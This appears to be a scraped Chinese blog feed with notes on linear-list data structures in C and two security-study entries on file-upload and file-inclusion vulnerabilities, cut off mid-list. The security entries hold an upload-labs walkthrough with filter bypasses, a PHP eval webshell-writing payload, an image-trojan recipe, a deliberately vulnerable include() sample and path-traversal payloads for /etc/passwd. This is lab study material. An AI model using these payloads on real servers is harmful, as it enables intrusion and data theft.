src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240304185935048.png" alt="image-20240304185935048"></p><h3 id="线性表的基本操作"><a href="#线性表的基本操作" class="headerlink" title="线性表的基本操作"></a>线性表的基本操作</h3><p><strong>初始化操作</strong></p><p><code> InitList( &amp;L )</code></p><p>操作结果：构造一个空的线性表L。</p><p> <strong>结构销毁操作</strong></p><p><code>DestroyList( &amp;L )</code></p><p>初始条件：线性表 L 已存在</p><p>操作结果：销毁线性表L</p><p><strong>引用型操作</strong></p><p><code>ListEmpty (L)</code> 线性表判空</p><p>初始条件：线性表L已存在</p><p>操作结果：若L为空表，则返回TRUE，否则返回FALSE</p><p><code>ListLength (L)</code> 求线性表的长度</p><p>初始条件：线性表L已存在</p><p>操作结果：返回L中元素个数</p><p><code>GetElem( L, i, &amp;e ) </code>求线性表中某个数据元素</p><p>初始条件：线性表L存在，且1 &lt;&#x3D; i &lt;&#x3D; LengthList(L) </p><p>操作结果：用e返回L中第i个元素的值</p><p><code>LocateElem( L, e, compare( ) )</code> 定位函数</p><p>初始条件：线性表L存在，e为给定值，cmpare()是判定函数</p><p>操作结果：返回L中第1个与e满足关系compare()的元素的位序，若这样的元素不存在，则返回值为0</p><p><code> PriorElem( L, cur_e, &amp;pre_e )</code> 求数据元素的前驱</p><p>初始条件：线性表L已存在</p><p>操作结果：若cur_e是L的元素，但不是第一个，则用pre_e 返回它的前驱，否则操作失败，pre_e无定义</p><p><code>NextElem( L, cur_e, &amp;next_e )</code> 求数据元素的后驱</p><p>初始条件：线性表L已存在</p><p>操作结果：若cur_e是L的元素，但不是最后一个，则用next_e返回它的后继，否则操作失败，next_e无定义</p><p><code> ListTraverse(L, visit( ))</code> 遍历线性表</p><p>初始条件：线性表L已存在，visit()为某个访问函数</p><p>操作结果：依次对L的每个元素调用函数visit( )。一旦visit( )失败，则操作失败。</p><p><strong>加工型操作</strong></p><p><code>ClearList(&amp;L)</code> 线性表置空</p><p>初始条件：线性表L已存在</p><p>操作结果：将L重置为空表</p><p><code>ListDelete(&amp;L,i,&amp;e)</code> 删除数据元素</p><p>初始条件：线性表L已存在且非空，1 ≤ i ≤ LengthList(L) </p><p>操作结果：删除L的第i个元素，并用e返回其值，L的长度减1</p><p><code>ListInsert( &amp;L, i, e )</code> 插入数据元素</p><p>初始条件：线性表L已存在， 且   1 ≤ i ≤ LengthList(L) + 1</p><p>操作结果：在L的第i个元素之前插入新的元素e，L的长度增1</p><h3 id="集合合并算法"><a href="#集合合并算法" class="headerlink" title="集合合并算法"></a>集合合并算法</h3><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240304192220554.png" alt="image-20240304192220554"></p><h3 id="有序表合并算法"><a href="#有序表合并算法" class="headerlink" title="有序表合并算法"></a>有序表合并算法</h3><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240304192435560.png" alt="image-20240304192435560"></p><h3 id="动态储存分配相关函数"><a href="#动态储存分配相关函数" class="headerlink" title="动态储存分配相关函数"></a>动态储存分配相关函数</h3><p>在C语言中，动态存储分配是通过使用标准库中的一组函数来实现的。这些函数包含在 <code>&lt;stdlib.h&gt;</code> 头文件中。以下是一些常用的动态存储分配相关函数：</p><ol><li><strong>malloc()</strong>:<ul><li>函数原型： <code>void* malloc(size_t size);</code></li><li>作用：分配指定大小的内存块，并返回指向该内存块起始地址的指针。如果分配失败，返回NULL。</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>calloc()</strong>:<ul><li>函数原型： <code>void* calloc(size_t num, size_t size);</code></li><li>作用：分配 num 个大小为 size 字节的连续内存块，并将每个字节初始化为零。返回指向该内存块起始地址的指针。</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* arr = (<span class="type">int</span>*)<span class="built_in">calloc</span>(<span class="number">5</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>realloc()</strong>:<ul><li>函数原型： <code>void* realloc(void* ptr, size_t size);</code></li><li>作用：重新分配之前由 <code>malloc</code>、<code>calloc</code> 或 <code>realloc</code> 分配的内存块的大小。如果扩展成功，返回指向新内存块的指针；如果失败，返回NULL。</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">arr = (<span class="type">int</span>*)<span class="built_in">realloc</span>(arr, <span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>free()</strong>:<ul><li>函数原型： <code>void free(void* ptr);</code></li><li>作用：释放之前通过 <code>malloc</code>、<code>calloc</code> 或 <code>realloc</code> 分配的内存块。释放后，指针不再指向有效的内存区域。</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* arr = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">free</span>(arr);</span><br></pre></td></tr></table></figure><h3 id="线性表顺序表示与实现——顺序表"><a href="#线性表顺序表示与实现——顺序表" class="headerlink" title="线性表顺序表示与实现——顺序表"></a>线性表顺序表示与实现——顺序表</h3><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240304192805745.png" alt="image-20240304192805745"></p><h3 id="顺序表的基本操作"><a href="#顺序表的基本操作" class="headerlink" title="顺序表的基本操作"></a>顺序表的基本操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ElemType *elem;</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> listsize;</span><br><span class="line">&#125; Sqlist;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(Sqlist *L, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">L-&gt;elem = (ElemType *)<span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">L-&gt;length = n;</span><br><span class="line">L-&gt;listsize = n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(Sqlist *L, <span class="type">int</span> a, ElemType b)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = L-&gt;length - <span class="number">1</span>; i &gt;= a - <span class="number">1</span>; i--) &#123;</span><br><span class="line">L-&gt;elem[i + <span class="number">1</span>] = L-&gt;elem[i];</span><br><span class="line">&#125;</span><br><span class="line">L-&gt;elem[a - <span class="number">1</span>] = b;</span><br><span class="line">L-&gt;length++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Delete</span><span class="params">(Sqlist *L, <span class="type">int</span> a)</span> &#123;</span><br><span class="line">ElemType deletedValue = L-&gt;elem[a - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = a; i &lt; L-&gt;length; i++) &#123;</span><br><span class="line">L-&gt;elem[i - <span class="number">1</span>] = L-&gt;elem[i];</span><br><span class="line">&#125;</span><br><span class="line">L-&gt;length--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, deletedValue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ElemType <span class="title function_">Get</span><span class="params">(Sqlist *L, <span class="type">int</span> a)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> L-&gt;elem[a - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Locate</span><span class="params">(Sqlist *L, ElemType b)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (L-&gt;elem[i] == b) &#123;</span><br><span class="line"><span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Clear</span><span class="params">(Sqlist *L)</span> &#123;</span><br><span class="line">L-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">Sqlist <span class="built_in">list</span>;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">InitList(&amp;<span class="built_in">list</span>, n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;(<span class="built_in">list</span>.elem[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> operation;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;operation);</span><br><span class="line"><span class="keyword">switch</span> (operation) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">Insert(&amp;<span class="built_in">list</span>, a, b);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">Delete(&amp;<span class="built_in">list</span>, a);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, Get(&amp;<span class="built_in">list</span>, a));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, Locate(&amp;<span class="built_in">list</span>, b));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">Clear(&amp;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="顺序储存结构的优缺点"><a href="#顺序储存结构的优缺点" class="headerlink" title="顺序储存结构的优缺点"></a>顺序储存结构的优缺点</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul><li>逻辑相邻且物理相邻</li><li>可随机存取任一元素</li><li>存储空间使用紧凑</li></ul><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul><li>插入、删除操作需要移动大量的元素</li><li>预先分配空间需按最大空间分配，利用不充分</li><li>表容量难以扩充</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大一下 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2024/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件上传漏洞的概念和危害"><a href="#任意文件上传漏洞的概念和危害" class="headerlink" title="任意文件上传漏洞的概念和危害"></a>任意文件上传漏洞的概念和危害</h2><ul><li><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>任意文件上传漏洞（Arbitrary File Upload Vulnerability）是一种常见的网络安全漏洞，通常存在于Web应用程序中。这种漏洞允许攻击者将恶意文件上传到Web服务器，从而可能导致服务器受到攻击或被入侵。</p><p>攻击者利用任意文件上传漏洞的步骤通常如下：</p><ol><li><strong>找到漏洞点</strong>：攻击者首先需要找到目标网站或Web应用程序中的文件上传功能，并确定是否存在安全漏洞。</li><li><strong>上传恶意文件</strong>：一旦发现存在漏洞，攻击者可以利用该漏洞来上传包含恶意代码的文件。这些文件可能是恶意脚本、后门程序、木马等，用于进一步攻击目标系统或获取敏感信息。</li><li><strong>执行恶意代码</strong>：上传成功后，攻击者可以通过触发上传的文件来执行其中包含的恶意代码。这可能会导致服务器被入侵、敏感数据被窃取、系统被控制等危险后果。</li></ol></li><li><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ol><li><strong>执行恶意代码</strong>：攻击者可以上传包含恶意代码的文件，如Webshell（Web后门），以获取对目标服务器的完全控制。一旦上传成功并执行，攻击者就可以执行任意系统命令、访问敏感数据或者利用服务器作为跳板进一步攻击其他系统。</li><li><strong>篡改网站内容</strong>：攻击者可以上传包含恶意内容的文件来篡改网站的页面，显示虚假信息、恶意链接或者欺骗用户输入敏感信息。</li><li><strong>敏感信息泄露</strong>：攻击者可以上传包含敏感信息的文件，如数据库备份文件、配置文件等，导致敏感信息泄露。</li><li><strong>服务拒绝</strong>：攻击者可以上传大型文件或者大量文件，导致服务器资源耗尽，服务拒绝给合法用户提供服务。</li><li><strong>绕过权限控制</strong>：攻击者可以上传包含用户权限或者访问控制规则的文件，绕过应用程序的权限控制机制，获取未经授权的权限。</li><li><strong>劫持用户会话</strong>：通过上传包含恶意脚本的文件，攻击者可以获取用户的会话标识，从而劫持用户的会话并进行进一步攻击或欺骗。</li></ol></li></ul><h2 id="任意文件上传漏洞的修复方式"><a href="#任意文件上传漏洞的修复方式" class="headerlink" title="任意文件上传漏洞的修复方式"></a>任意文件上传漏洞的修复方式</h2><ol><li><strong>输入验证和过滤</strong>：在服务器端对用户上传的文件进行输入验证和过滤，确保只允许上传可信文件类型，并拒绝上传具有恶意或非法文件扩展名的文件。可以使用白名单和黑名单机制来限制上传文件的类型。</li><li><strong>文件类型检查</strong>：对上传的文件进行严格的文件类型检查，可以通过检查文件的魔术数字（magic number）、文件扩展名等方式来验证文件的类型是否符合预期。</li><li><strong>文件内容检查</strong>：对上传的文件内容进行检查，确保不包含恶意代码或恶意内容。可以使用反病毒软件或文件内容检测工具来扫描上传的文件，检测其中是否包含恶意代码。</li><li><strong>文件权限控制</strong>：确保上传的文件存储在安全的目录中，并设置适当的文件权限，以防止恶意用户通过上传恶意文件获取对服务器的访问权限。</li><li><strong>隔离上传文件</strong>：将用户上传的文件与应用程序代码和其他系统文件隔离开来，确保上传的文件不会影响到应用程序的正常运行或系统的安全性。</li><li><strong>文件重命名</strong>：在保存上传文件时，将文件重命名为随机生成的唯一文件名，以防止恶意用户上传同名文件覆盖系统文件或执行攻击。</li><li><strong>沙箱动态监测</strong>：使用沙箱技术，将上传的文件在受控环境中进行动态监测和分析。通过模拟执行环境，监测文件是否包含恶意代码、恶意行为或者不良影响，并且在检测到可疑行为时采取相应的防御措施，如拒绝文件上传或者将文件标记为不安全。</li><li><strong>安全编码实践</strong>：开发者应该遵循安全编码实践，如最小特权原则、避免使用不安全的函数和库、定期更新和修补软件等，以降低漏洞被利用的风险。</li></ol><h2 id="图片马制作方式"><a href="#图片马制作方式" class="headerlink" title="图片马制作方式"></a>图片马制作方式</h2><ol><li><p>使用文本方式打开，在末尾粘贴一句话木马</p></li><li><p>在cmd中输入命令<code>copy 1.jpg/b+2.php 3.jpg</code></p><ul><li><p>&#x2F;b是二进制形式打开</p></li><li><p>&#x2F;a是ascii方式打开</p></li></ul></li><li><p>16进制打开图片在末尾添加一句话木马</p></li><li><p>Photoshop打开</p></li></ol><p>注意：</p><ul><li>单纯的图片马并不能直接和蚁剑连接，因为该文件依然是以image格式进行解析，</li><li>只有利用<strong>文件包含漏洞</strong>（在代码中引入其他文件作为php文件执行时，未对文件进行严格过滤，导致用户指定任意文件，都作为php文件解析执行）才能成功利用该木马</li></ul><h2 id="upload-labs题解"><a href="#upload-labs题解" class="headerlink" title="upload-labs题解"></a>upload-labs题解</h2><p>upload-labs靶机包含漏洞类型分类：</p><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/mind-map.png" alt="mind-map"></p><p>如何判断上传漏洞类型？</p><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/sum_up.png" alt="sum_up"></p><ul><li><p>Pass-01</p><p>前端校验文件名是否安全。绕过方法：禁用javascript，或者上传白名单后缀文件，burp捉包修改为对应服务器能够解释的文件后缀。</p></li><li><p>Pass-02</p><p>后端校验文件类型是否为image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif。绕过方法：修改Content-Type: application&#x2F;octet-stream为Content-Type: image&#x2F;jpeg即可。</p></li><li><p>Pass-03</p><p>上传php其他后缀名</p></li><li><p>Pass-04</p><p>上传.htaccess文件</p></li><li><p>Pass-05</p><p>文件后缀大小写绕过</p></li><li><p>Pass-06</p><p>空格绕过：利用Windows对“文件名中空格会被作为空处理”的特性，程序检测后缀名.php ，空格会自动删除。</p></li><li><p>Pass-07</p><p> .号绕过：</p></li><li><p>Pass-08</p><p>::$DATA绕过（特殊符合不能成功新建）文件名+“::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名。如：“phpinfo.php::$DATA”  windows会自动处理末尾的::$DATA 变成“phpinfo.php” 。</p></li><li><p>Pass-09</p><p> .空.绕过</p></li><li><p>Pass-10</p><p>双写绕过</p></li><li><p>Pass-11</p><p>白名单限制，$_GET[‘save_path’]路径可控。GET：通过%00截断，上传文件</p></li><li><p>Pass-12</p><p>白名单限制，$_POST[‘save_path’]路径可控。POST：通过HEX改值为php+00截断，上传文件</p></li><li><p>Pass-13</p><p>文件包含，上传图片马</p></li><li><p>Pass-14</p><p>文件包含，检查图片的长宽高。通过copy 1.jpg&#x2F;b + 2.php&#x2F;a shell.jpg，新建图片马</p></li><li><p>Pass-15</p><p>文件包含，检查图片的长宽高。通过copy 1.jpg&#x2F;b + 2.php&#x2F;a shell.jpg，新建图片马</p></li><li><p>Pass-16</p><p>文件包含，二次渲染。上传大图片马，使其在服务器中二次渲染，获取下载并对比二次渲染后的图片马特征。挑选未被渲染的地方，插入payload。</p></li><li><p>Pass-17</p><p>条件竞争，<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[x]);&gt;&#39;);?&gt;</code></p></li><li><p>Pass-18</p><p>Apache解析漏洞+条件竞争</p></li><li><p>Pass-19</p><p>文件名可控，黑名单绕过，使用shell.php.绕过黑名单上传</p></li><li><p>Pass-20</p><p>白名单限制，检查MIME和后缀名。</p></li><li><p>Pass-21</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2024/02/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/02/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞的定义"><a href="#文件包含漏洞的定义" class="headerlink" title="文件包含漏洞的定义"></a>文件包含漏洞的定义</h2><p>​文件包含漏洞（File Inclusion Vulnerability）是一种常见的安全漏洞，存在于许多Web应用程序中。它通常发生在应用程序未正确过滤用户提供的输入数据时。文件包含漏洞允许攻击者通过将恶意文件或远程资源包含到应用程序中的文件中，来执行未授权的操作。</p><p>​文件包含漏洞主要存在于动态网页应用程序中，特别是基于服务器端脚本语言（如PHP）的应用程序。它通常出现在开发人员使用用户提供的输入来构造文件路径、文件名或文件内容时。</p><p>​攻击者利用文件包含漏洞的常见方式之一是通过构造恶意URL，将恶意文件路径作为参数传递给应用程序。如果应用程序未正确验证和过滤该参数，攻击者可以通过指定恶意文件路径来包含任意文件，包括系统文件、应用程序文件或其他用户文件。这可能导致严重的安全问题，如远程代码执行、敏感信息泄露、服务器控制权被获取等。</p><p>​文件包含漏洞还可以利用远程文件包含（Remote File Inclusion）的方式。攻击者可以通过指定远程服务器上的恶意脚本或文件路径来利用漏洞。应用程序在处理远程文件包含时，未对其进行适当的验证和过滤，导致攻击者能够在目标服务器上执行任意代码。</p><h2 id="文件包含的危害"><a href="#文件包含的危害" class="headerlink" title="文件包含的危害"></a>文件包含的危害</h2><ol><li><strong>远程代码执行</strong>：攻击者可以通过文件包含漏洞注入恶意代码并执行，这可能导致服务器上的任意代码执行。攻击者可以执行恶意操作，如修改、删除、上传文件，控制服务器，访问敏感数据，甚至获取系统权限。</li><li><strong>敏感信息泄露</strong>：通过文件包含漏洞，攻击者可以访问包含在应用程序中的敏感信息，例如数据库凭据、API密钥、密码文件等。这些信息可能被用于进一步的攻击或滥用。</li><li><strong>服务器崩溃</strong>：攻击者可以通过构造恶意文件路径或远程资源来导致服务器过载或崩溃。这可能会导致服务不可用，影响业务连续性。</li><li><strong>拒绝服务（DoS）攻击</strong>：攻击者可以通过频繁请求恶意文件来耗尽服务器资源，从而导致拒绝服务攻击。这会使合法用户无法正常访问应用程序。</li><li><strong>操作系统命令执行</strong>：如果应用程序在文件包含过程中使用了用户提供的输入来构造操作系统命令，攻击者可以通过构造恶意输入来执行任意命令，从而控制服务器。</li><li><strong>依赖文件篡改</strong>：攻击者可以篡改被包含的文件，例如修改配置文件、库文件或其他关键文件，以达到他们的目的。</li></ol><h2 id="文件包含漏洞常见函数"><a href="#文件包含漏洞常见函数" class="headerlink" title="文件包含漏洞常见函数"></a>文件包含漏洞常见函数</h2><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>函数：</li></ul><ol><li><p>**include() 和 require()**：</p><p>这些函数用于将指定文件包含到当前脚本中。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，就可能存在文件包含漏洞。</p></li><li><p><strong>include_once()</strong> 和 **require_once()**：</p><p>类似于 include() 和 require()，但是它们确保同一个文件只被包含一次。文件包含漏洞可能仍然存在，如果恶意文件被成功包含，它将被执行一次。</p></li><li><p>**eval()**：</p><p>这个函数用于执行包含在字符串中的 PHP 代码。如果字符串是基于用户输入构造的，并且没有进行适当的验证和过滤，可能导致远程代码执行漏洞。</p></li><li><p>**file_get_contents()**：</p><p>这个函数用于读取文件的内容，并将其作为字符串返回。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p></li><li><p>**readfile()**：</p><p>类似于 file_get_contents()，它用于将文件内容直接输出到浏览器。如果文件路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p></li><li><p>**get_template_part()**：</p><p>这个函数常用于WordPress主题开发，用于包含模板文件。如果模板文件的路径是基于用户提供的输入构造的，并且没有进行适当的验证和过滤，可能存在文件包含漏洞。</p></li></ol><h2 id="模糊POC"><a href="#模糊POC" class="headerlink" title="模糊POC"></a>模糊POC</h2><p>文件包含漏洞的模糊POC（Proof of Concept）是一种用于测试应用程序是否存在文件包含漏洞的简单示例。它通常通过构造包含文件路径或资源的参数来尝试触发漏洞。以下是一个常见的文件包含漏洞的模糊POC示例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/page.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>上述示例中的URL参数<code>file</code>用于指定要包含的文件路径。通过使用相对路径和父目录（<code>../</code>）来构造路径，攻击者试图访问<code>/etc/passwd</code>文件。如果应用程序未对输入进行适当的验证和过滤，可能会成功包含敏感文件，并将其内容返回给攻击者。</p><p>其他例子：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Linux</span><br><span class="line">?file=../../../etc/passwd</span><br><span class="line">?file=/etc/passwd</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">?file=../../../../windows/win.ini</span><br><span class="line">?file=c:/windows/win.ini</span><br></pre></td></tr></table></figure><h2 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h2><p>在 php.ini 里有两个重要的参数 allow_url_fopen、allow_url_include。</p><p><strong>allow_url_fopen</strong>:默认值是 ON。允许 url 里的封装协议访问文件；</p><p><strong>allow_url_include</strong>:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p><ol><li>**file:&#x2F;&#x2F;**：该伪协议用于指定本地文件系统中的文件路径。攻击者可以使用相对路径或绝对路径来指定要包含的文件，例如使用<code>file:///etc/passwd</code>来访问<code>/etc/passwd</code>文件。</li><li><strong>http:&#x2F;&#x2F;</strong> 和 